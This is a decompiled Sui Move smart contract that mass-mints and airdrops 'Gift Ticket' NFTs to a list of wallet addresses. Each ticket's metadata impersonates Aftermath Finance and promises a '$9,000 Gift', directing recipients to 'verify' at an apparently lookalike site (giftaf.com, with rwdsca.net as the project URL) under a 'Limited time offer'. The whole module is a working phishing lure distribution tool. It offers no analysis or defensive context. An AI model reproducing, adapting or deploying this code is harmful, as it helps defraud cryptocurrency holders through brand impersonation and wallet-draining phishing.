module 0x8d9d9a5f6e4e79e589874489640ab62846f005a732e74d3e5c0606d48680410::gift2166 {
    struct GIFT2166 has drop {
        dummy_field: bool,
    }

    struct TICKET_2166 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Gift: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Gift: 0x1::string::String,
    }

    public fun DistributeGift2166(arg0: &mut vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(arg0) > 0) {
            let v0 = TICKET_2166{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Gift Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729525291/giftafcom_1021_1_rvoyyg.jpg"),
                description : 0x1::string::utf8(b"Claim your $9,000 Gift from Aftermath Finance! Visit https://giftaf.com to verify and receive your gift. Limited time offer!"),
                Gift        : 0x1::string::utf8(b"$9,000"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<TICKET_2166>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Gift Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729525291/giftafcom_1021_1_rvoyyg.jpg"),
                description : 0x1::string::utf8(b"Claim your $9,000 Gift from Aftermath Finance! Visit https://giftaf.com to verify and receive your gift. Limited time offer!"),
                Gift        : 0x1::string::utf8(b"$9,000"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<TICKET_2166>(v0, 0x1::vector::pop_back<address>(arg0));
        };
    }

    fun init(arg0: GIFT2166, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Gift"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Gift Ticket"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729525291/giftafcom_1021_1_rvoyyg.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Claim your $9,000 Gift from Aftermath Finance! Visit https://giftaf.com to verify and receive your gift. Limited time offer!"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://rwdsca.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Aftermath Finance"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$9,000"));
        let v4 = 0x2::package::claim<GIFT2166>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<TICKET_2166>(&v4, v0, v2, arg1);
        0x2::display::update_version<TICKET_2166>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<TICKET_2166>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

